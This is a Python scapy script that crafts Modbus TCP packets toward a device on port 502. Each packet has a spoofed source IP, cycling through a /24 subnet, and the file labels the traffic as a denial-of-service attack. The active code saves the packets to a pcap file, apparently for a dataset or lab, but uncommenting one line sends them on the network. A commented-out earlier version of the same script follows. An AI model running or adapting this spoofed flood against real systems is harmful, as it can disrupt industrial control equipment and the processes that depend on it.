from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether  # Import the Ethernet layer

# Define the target IP, Modbus port, and Ethernet addresses
target_ip = "172.16.0.20"
target_port = 502
src_mac = "08:f1:ea:6d:c0:94"  
dst_mac = "00:00:54:32:75:ca"  

# Function to generate sequential IP addresses in the 172.16.0.x range
def sequential_ip(start, end):
    for i in range(start, end + 1):
        yield f"172.16.0.{i}"

# Create a basic Modbus packet (e.g., Read Holding Registers)
modbus_pkt = TCP(dport=target_port) / Raw(load=b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01')

# Use sequential IPs within the 172.16.0.0/24 subnet
start_ip = 1  # Start at 172.16.0.1
end_ip = 254  # End at 172.16.0.254

# Send or save attack packets with sequential source IPs
for src_ip in sequential_ip(start_ip, end_ip):
    pkt = Ether(src=src_mac, dst=dst_mac) / IP(src=src_ip, dst=target_ip) / modbus_pkt  # Include Ethernet layer with specified src and dst MACs
    # Save or send the packet (choose one)
    wrpcap(f"modbus_attack_dos2.pcap", pkt, append=True)
    # sendp(pkt, verbose=False)  
























# from scapy.all import *

# from scapy.layers.inet import IP, TCP

# # Define the target IP and Modbus port
# target_ip = "172.16.0.20"
# target_port = 502


# # Function to generate sequential IP addresses in the 172.16.0.x range
# def sequential_ip(start, end):
#     for i in range(start, end + 1):
#         yield f"172.16.0.{i}"

# # Create a basic Modbus packet (e.g., Read Holding Registers)
# modbus_pkt = TCP(dport=target_port)/Raw(load=b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01')

# # Use sequential IPs within the 172.16.0.0/24 subnet
# start_ip = 1  # Start at 172.16.0.1
# end_ip = 254  # End at 172.16.0.254

# # Send or save  attack packets with sequential source IPs
# for src_ip in sequential_ip(start_ip, end_ip):
#     pkt = IP(src=src_ip, dst=target_ip) / modbus_pkt
#     # wrpcap(f"modbus_attack_dos.pcap", pkt, append=True)
#     # sendp(pkt, verbose=False)
    

